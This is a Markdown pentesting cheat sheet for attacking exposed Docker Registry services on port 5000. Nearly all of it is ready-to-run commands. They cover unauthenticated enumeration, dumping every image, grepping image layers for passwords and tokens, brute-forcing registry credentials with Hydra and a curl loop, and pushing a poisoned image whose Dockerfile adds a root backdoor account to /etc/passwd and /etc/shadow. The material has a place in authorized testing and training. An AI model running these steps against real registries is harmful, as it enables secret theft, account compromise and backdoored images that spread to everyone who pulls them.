# Port 5000 - Docker Registry

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Post Exploitation](#post-exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s http://$rhost:5000/v2/ && curl -s http://$rhost:5000/v2/_catalog | jq
```

### Nmap Scripts

```shell
nmap -sV -sC -p5000 $rhost
```

### Check Registry Version

```shell
curl http://$rhost:5000/v2/
curl -I http://$rhost:5000/v2/
```

### List Repositories

```shell
# List all repositories
curl http://$rhost:5000/v2/_catalog

# With authentication
curl -u user:pass http://$rhost:5000/v2/_catalog
```

### List Image Tags

```shell
# List tags for specific image
curl http://$rhost:5000/v2/<image>/tags/list

# Example
curl http://$rhost:5000/v2/nginx/tags/list
curl http://$rhost:5000/v2/myapp/tags/list
```

---

## Exploitation

### Download Image Layers

```shell
# Get manifest
curl http://$rhost:5000/v2/<image>/manifests/<tag>

# Get manifest v2
curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  http://$rhost:5000/v2/<image>/manifests/<tag>

# Download layer (blob)
curl http://$rhost:5000/v2/<image>/blobs/<digest> -o layer.tar.gz
```

### Using DockerRegistryGrabber

```shell
# https://github.com/Syzik/DockerRegistryGrabber

git clone https://github.com/Syzik/DockerRegistryGrabber.git
cd DockerRegistryGrabber
pip install -r requirements.txt

# List images
python drg.py http://$rhost -p 5000 --list

# Dump image
python drg.py http://$rhost -p 5000 --dump <image>

# Dump all images
python drg.py http://$rhost -p 5000 --dump_all
```

### Using crane

```shell
# Install crane
go install github.com/google/go-containerregistry/cmd/crane@latest

# List repos
crane catalog $rhost:5000

# List tags
crane ls $rhost:5000/image

# Pull image
crane pull $rhost:5000/image:tag image.tar
```

### Pull with Docker

```shell
# Add insecure registry
# Edit /etc/docker/daemon.json
{
  "insecure-registries": ["$rhost:5000"]
}

# Restart docker
systemctl restart docker

# Pull image
docker pull $rhost:5000/image:tag

# Run and explore
docker run -it $rhost:5000/image:tag /bin/sh
```

---

## Post Exploitation

### Extract Secrets from Images

```shell
# Pull and extract
docker pull $rhost:5000/myapp:latest
docker save $rhost:5000/myapp:latest > image.tar
tar xf image.tar

# Search for secrets
find . -name "*.tar" -exec tar tf {} \; | grep -E "\.env|config|secret|key|password"

# Extract and search layers
for layer in $(find . -name "*.tar"); do
  tar xf $layer -C extracted/
done

grep -r "password\|secret\|key\|token" extracted/
```

### Look for Environment Variables

```shell
# Get image config
curl http://$rhost:5000/v2/<image>/manifests/<tag> | jq '.config'

# Download config blob
curl http://$rhost:5000/v2/<image>/blobs/<config-digest> | jq '.config.Env'
```

### Image History

```shell
# View image history (may contain secrets in commands)
docker history $rhost:5000/image:tag --no-trunc
```

### Push Malicious Image

```shell
# If registry allows push
# Create malicious Dockerfile
cat > Dockerfile << EOF
FROM $rhost:5000/originalimage:latest
RUN echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
RUN echo "backdoor:\$6\$salt\$hash:0:0:99999:7:::" >> /etc/shadow
EOF

# Build and push
docker build -t $rhost:5000/originalimage:latest .
docker push $rhost:5000/originalimage:latest
```

---

## Authentication Bypass

### Check for No Auth

```shell
# Should return 200 if no auth
curl http://$rhost:5000/v2/

# Returns 401 if auth required
```

### Brute Force

```shell
# Hydra
hydra -L users.txt -P passwords.txt $rhost http-get /v2/

# Custom script
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    if curl -s -u $user:$pass http://$rhost:5000/v2/ | grep -q "{}"; then
      echo "[+] Found: $user:$pass"
    fi
  done
done
```

---

## Tools

- DockerRegistryGrabber: https://github.com/Syzik/DockerRegistryGrabber
- crane: https://github.com/google/go-containerregistry
- skopeo: https://github.com/containers/skopeo
- dive: https://github.com/wagoodman/dive (for image analysis)

---

## References

- [HackTricks - Docker Registry](https://book.hacktricks.wiki/network-services-pentesting/5000-pentesting-docker-registry.html)
